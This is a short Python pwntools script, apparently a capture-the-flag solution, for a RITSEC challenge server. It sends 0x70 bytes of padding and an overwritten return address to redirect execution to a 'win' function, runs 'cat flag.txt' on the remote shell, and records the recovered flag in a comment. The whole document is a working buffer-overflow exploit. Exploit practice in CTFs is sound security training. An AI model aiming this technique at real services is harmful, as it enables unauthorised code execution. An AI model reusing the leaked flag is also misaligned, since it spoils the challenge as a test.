from pwn import *

context.terminal = ['kitty']

r = remote("ctf.ritsec.club", 30839)


win = p64(0x10446)

count = 0x70

r.read()
r.sendline(b'A'*count + win)
r.sendline(b'cat flag.txt')
print(r.readall(0.5))

# RS{CLU3S_1N_R1DDL3S_4R3_C0NFUS1NG}
